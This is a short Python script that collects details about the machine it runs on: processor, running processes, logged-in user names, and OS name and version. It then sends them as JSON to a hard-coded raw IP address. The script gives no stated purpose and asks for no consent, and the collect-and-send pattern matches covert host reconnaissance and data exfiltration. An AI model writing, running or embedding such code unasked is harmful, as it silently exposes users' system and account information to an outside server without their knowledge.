import os
import platform
import psutil
import requests
import json

def get_system_info():
    info = {
        "processor": platform.processor(),
        "processes": [proc.info for proc in psutil.process_iter(['pid', 'name'])],
        "users": [user.name for user in psutil.users()],
        "os_name": platform.system(),
        "os_version": platform.version()
    }
    return info

def send_data_to_api(data):
    url = "http://54.158.137.13:8000/collect_data"
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, headers=headers, data=json.dumps(data))
    return response.status_code

if __name__ == "__main__":
    system_info = get_system_info()
    status_code = send_data_to_api(system_info)
    print(f"Data sent to API, status code: {status_code}")